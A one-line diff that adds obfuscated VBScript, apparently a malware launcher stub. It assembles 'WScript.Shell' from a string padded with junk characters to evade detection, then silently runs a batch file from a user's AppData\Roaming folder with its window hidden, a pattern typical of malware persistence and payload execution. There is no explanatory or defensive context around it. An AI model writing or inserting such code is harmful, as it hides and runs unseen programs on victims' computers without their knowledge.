@@ -1,0 +1,1 @@
+CreateObject(Replace("WScrbXeWbibXeWbptbXeWb.ShbXeWbellbXeWb","bXeWb","")).Run """C:\Users\David\AppData\Roaming\lveka.bat""", 0
